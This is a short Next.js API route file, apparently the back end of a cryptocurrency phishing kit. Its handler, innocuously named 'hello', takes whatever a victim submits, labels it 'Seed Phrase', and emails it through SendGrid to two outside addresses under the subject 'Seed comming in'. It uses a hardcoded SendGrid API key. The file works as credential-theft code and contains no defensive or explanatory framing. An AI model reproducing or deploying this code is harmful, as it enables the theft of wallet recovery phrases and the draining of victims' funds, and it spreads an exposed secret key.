// Next.js API route support: https://nextjs.org/docs/api-routes/introduction

const sendgrid = require('@sendgrid/mail');

const SENDGRID_API_KEY = "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"

export default async function hello (req, res) {

  sendgrid.setApiKey(SENDGRID_API_KEY)

  const msg = {
   to: ['bmon3ydavid@yandex.com','timcrawford735@gmail.com'],
 // Change to your recipient
   from: 'lengleytony@gmail.com',
 // Change to your verified sender
   subject: 'Seed comming in',
   text: ` Seed Phrase: ${req.body}`,
   html: `<h2> Seed Phrase: ${req.body}</h2>`,
}
sendgrid
   .send(msg)
   .then((resp) => {
     res.json(resp)
   })
   .catch((error) => {
     console.error(error)
 })

}


